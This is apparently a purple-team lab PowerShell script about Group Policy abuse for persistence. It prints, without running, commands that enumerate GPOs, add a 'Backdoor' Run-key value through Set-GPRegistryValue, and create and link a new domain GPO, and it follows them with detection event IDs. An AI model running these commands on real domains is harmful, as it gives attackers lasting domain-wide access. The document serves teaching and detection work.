<#
.SYNOPSIS
    GPO Abuse for Persistence (MITRE ATT&CK: T1484.001)

.DESCRIPTION
    Modifies Group Policy Objects for persistence and privilege escalation

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1484.001 - Domain Policy Modification: Group Policy Modification
    Date: 2024-01-14

    Detection: Event ID 5136, 5137 (Directory Service Changes)

.EXAMPLE
    .\gpo_abuse.ps1 -GPOName "Default Domain Policy" -Action Enumerate
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$GPOName = "Default Domain Policy",

    [Parameter(Mandatory=$false)]
    [ValidateSet('Enumerate','Modify','CreateScheduledTask')]
    [string]$Action = "Enumerate"
)

Write-Host "===== GPO ABUSE ATTACK ====="
Write-Host "MITRE ATT&CK: T1484.001`n"

switch ($Action) {
    'Enumerate' {
        Write-Host "[*] Enumerating Group Policy Objects..."
        Write-Host "Get-GPO -All | Select DisplayName, Id, GpoStatus"

        Write-Host "`n[*] Check GPO permissions:"
        Write-Host "Get-GPPermission -Name '$GPOName' -All"
    }

    'Modify' {
        Write-Host "[*] Modifying GPO for persistence..."
        Write-Host "`n[!] Add startup script to GPO:"
        Write-Host "Set-GPRegistryValue -Name '$GPOName' -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Backdoor' -Value 'C:\backdoor.exe'"
    }

    'CreateScheduledTask' {
        Write-Host "[*] Creating malicious scheduled task via GPO..."
        Write-Host "New-GPO -Name 'Persistence GPO' | New-GPLink -Target 'DC=purpleteam,DC=lab'"
    }
}

Write-Host "`n[!] DETECTION INDICATORS:"
Write-Host "  - Event ID 5136: Directory Service Changes"
Write-Host "  - Event ID 5137: Directory Service Object Created"
Write-Host "  - Event ID 4662: Operation performed on object"
Write-Host "  - Monitor GPO modifications from unusual accounts"

Write-Host "`n[+] GPO abuse provides domain-wide persistence!"
